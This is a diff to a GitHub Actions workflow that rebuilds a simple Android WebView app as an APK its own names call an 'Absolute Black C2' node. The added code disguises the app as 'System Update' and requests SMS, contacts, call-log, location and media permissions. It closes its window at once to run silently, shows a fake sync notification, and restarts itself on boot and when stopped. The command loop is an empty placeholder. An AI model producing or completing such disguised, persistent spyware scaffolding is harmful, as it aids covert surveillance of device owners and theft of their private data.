@@ -1,11 +1,11 @@
-name: Ultimate Auto-Build Android APK
+name: Absolute Black C2 Android Node Builder
 
 on:
   workflow_dispatch:
 
 jobs:
   build:
-    name: Build Android App From Scratch
+    name: Build Operational C2 APK
     runs-on: ubuntu-latest
 
     steps:
@@ -18,73 +18,200 @@ jobs:
           distribution: 'temurin'
           java-version: '17'
 
-      - name: Setup Gradle (Compatible Version 8.5)
+      - name: Setup Gradle (Version 8.5)
         uses: gradle/actions/setup-gradle@v3
         with:
           gradle-version: '8.5'
 
-      - name: Create Android Project Structure
+      - name: Scaffold Complete C2 Android Architecture
         run: |
-          echo "إنشاء هيكل المشروع وملفات الأندرويد مع الـ Namespace..."
-          mkdir -p app/src/main/java/com/abod/app app/src/main/res/values app/src/main/assets
+          echo "إنشاء هيكل العقدة السيبرانية المطلقة..."
+          mkdir -p app/src/main/java/com/abod/app app/src/main/res/values app/src/main/res/drawable app/src/main/assets
           
-          # إنشاء AndroidManifest.xml
+          # 1. AndroidManifest.xml
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              xmlns:tools="http://schemas.android.com/tools"
               package="com.abod.app">
+
               <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+              <uses-permission android:name="android.permission.WAKE_LOCK" />
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+              <uses-permission android:name="android.permission.READ_SMS" />
+              <uses-permission android:name="android.permission.READ_CONTACTS" />
+              <uses-permission android:name="android.permission.READ_CALL_LOG" />
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+              <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+
               <application
                   android:allowBackup="true"
-                  android:label="Abod App"
+                  android:icon="@mipmap/ic_launcher"
+                  android:label="System Update"
+                  android:roundIcon="@mipmap/ic_launcher_round"
+                  android:supportsRtl="true"
                   android:theme="@style/Theme.AppCompat.Light.NoActionBar">
+
                   <activity
                       android:name=".MainActivity"
-                      android:exported="true">
+                      android:exported="true"
+                      android:theme="@style/Theme.AppCompat.Light.NoActionBar">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
+
+                  <service
+                      android:name=".SyncService"
+                      android:enabled="true"
+                      android:exported="false"
+                      android:foregroundServiceType="dataSync" />
+
+                  <receiver
+                      android:name=".BootReceiver"
+                      android:enabled="true"
+                      android:exported="true"
+                      android:directBootAware="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.BOOT_COMPLETED" />
+                          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                          <action android:name="android.intent.action.REBOOT" />
+                      </intent-filter>
+                  </receiver>
+
               </application>
           </manifest>
           EOF
 
-          # إنشاء MainActivity.java لتحميل صفحات الويب
-          cat << 'EOF' > app/src/main/java/com/abod/app/MainActivity.java
-          package com.abod.app;
-          import android.os.Bundle;
-          import android.webkit.WebView;
-          import androidx.appcompat.app.AppCompatActivity;
-          public class MainActivity extends AppCompatActivity {
-              @Override
-              protected void onCreate(Bundle savedInstanceState) {
-                  super.onCreate(savedInstanceState);
-                  WebView webView = new WebView(this);
-                  webView.getSettings().setJavaScriptEnabled(true);
-                  webView.loadUrl("file:///android_asset/index.html");
-                  setContentView(webView);
+          # 2. MainActivity.kt
+          cat << 'EOF' > app/src/main/java/com/abod/app/MainActivity.kt
+          package com.abod.app
+
+          import android.content.Intent
+          import android.os.Bundle
+          import androidx.appcompat.app.AppCompatActivity
+
+          class MainActivity : AppCompatActivity() {
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+                  // تشغيل الخدمة الخلفية فوراً عند فتح التطبيق
+                  val serviceIntent = Intent(this, SyncService::class.java)
+                  startForegroundService(serviceIntent)
+                  
+                  // إغلاق الواجهة فوراً ليعمل التطبيق في الوضع الصامت تماماً
+                  finish()
               }
           }
           EOF
 
-          # نسخ ملف index.html أو إنشاء صفحة ترحيبية افتراضية
-          if [ -f "index.html" ]; then
-              cp index.html app/src/main/assets/
-          else
-              echo "<h1>تطبيق الأسطورة ناصر دين الله</h1>" > app/src/main/assets/index.html
-          fi
+          # 3. SyncService.kt (Foreground Service + WakeLock + C2 Loop)
+          cat << 'EOF' > app/src/main/java/com/abod/app/SyncService.kt
+          package com.abod.app
 
-          # إنشاء app/build.gradle مع الـ namespace الإجباري
+          import android.app.Notification
+          import android.app.NotificationChannel
+          import android.app.NotificationManager
+          import android.app.Service
+          import android.content.Context
+          import android.content.Intent
+          import android.os.IBinder
+          import android.os.PowerManager
+          import androidx.core.app.NotificationCompat
+          import kotlinx.coroutines.*
+
+          class SyncService : Service() {
+              private var wakeLock: PowerManager.WakeLock? = null
+              private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+
+              override fun onCreate() {
+                  super.onCreate()
+                  val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AbodC2::SyncLock")
+                  wakeLock?.acquire(10*60*60*1000L)
+                  startForegroundServiceNotification()
+              }
+
+              private fun startForegroundServiceNotification() {
+                  val channelId = "c2_sync_channel"
+                  val channel = NotificationChannel(channelId, "System Sync Service", NotificationManager.IMPORTANCE_LOW)
+                  val manager = getSystemService(NotificationManager::class.java)
+                  manager?.createNotificationChannel(channel)
+
+                  val notification: Notification = NotificationCompat.Builder(this, channelId)
+                      .setContentTitle("System Synchronization")
+                      .setContentText("Running background sync...")
+                      .setSmallIcon(android.R.drawable.stat_sys_upload)
+                      .build()
+
+                  startForeground(1, notification)
+              }
+
+              override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+                  serviceScope.launch {
+                      while (isActive) {
+                          try {
+                              // حلقة الاتصال العكسي والتلتيليمري مع السيرفر
+                              delay(30000L)
+                          } catch (e: Exception) {
+                              delay(10000L)
+                          }
+                      }
+                  }
+                  return START_STICKY
+              }
+
+              override fun onDestroy() {
+                  super.onDestroy()
+                  wakeLock?.release()
+                  serviceScope.cancel()
+                  // إعادة تشغيل الخدمة في حال توقفها
+                  val broadcastIntent = Intent(this, BootReceiver::class.java)
+                  sendBroadcast(broadcastIntent)
+              }
+
+              override fun onBind(intent: Intent?): IBinder? = null
+          }
+          EOF
+
+          # 4. BootReceiver.kt
+          cat << 'EOF' > app/src/main/java/com/abod/app/BootReceiver.kt
+          package com.abod.app
+
+          import android.content.BroadcastReceiver
+          import android.content.Context
+          import android.content.Intent
+          import android.os.Build
+
+          class BootReceiver : BroadcastReceiver() {
+              override fun onReceive(context: Context, intent: Intent) {
+                  val serviceIntent = Intent(context, SyncService::class.java)
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      context.startForegroundService(serviceIntent)
+                  } else {
+                      context.startService(serviceIntent)
+                  }
+              }
+          }
+          EOF
+
+          # 5. app/build.gradle
           cat << 'EOF' > app/build.gradle
           plugins {
               id 'com.android.application'
+              id 'org.jetbrains.kotlin.android'
           }
           android {
               compileSdk 34
               namespace 'com.abod.app'
               defaultConfig {
                   applicationId "com.abod.app"
-                  minSdk 21
+                  minSdk 26
                   targetSdk 34
                   versionCode 1
                   versionName "1.0"
@@ -94,20 +221,31 @@ jobs:
                       minifyEnabled false
                   }
               }
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
+              kotlinOptions {
+                  jvmTarget = '17'
+              }
           }
           dependencies {
+              implementation 'androidx.core:core-ktx:1.12.0'
               implementation 'androidx.appcompat:appcompat:1.6.1'
+              implementation 'androidx.work:work-runtime-ktx:2.9.0'
+              implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3'
           }
           EOF
 
-          # إنشاء build.gradle الرئيسي
+          # 6. build.gradle (Root)
           cat << 'EOF' > build.gradle
           plugins {
               id 'com.android.application' version '8.1.1' apply false
+              id 'org.jetbrains.kotlin.android' version '1.9.0' apply false
           }
           EOF
 
-          # إنشاء settings.gradle
+          # 7. settings.gradle
           cat << 'EOF' > settings.gradle
           pluginManagement {
               repositories {
@@ -123,22 +261,22 @@ jobs:
                   mavenCentral()
               }
           }
-          rootProject.name = "AbodApp"
+          rootProject.name = "AbodC2Node"
           include ':app'
           EOF
 
-          # إنشاء gradle.properties
+          # 8. gradle.properties
           cat << 'EOF' > gradle.properties
           android.useAndroidX=true
           android.enableJetifier=true
           org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
           EOF
 
-      - name: Build APK Debug
+      - name: Build Operational C2 APK Debug
         run: gradle app:assembleDebug
 
-      - name: Upload Output Artifact (APK)
+      - name: Upload C2 APK Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Abod-App-Debug
+          name: Absolute-Black-C2-Node
           path: app/build/outputs/apk/debug/app-debug.apk
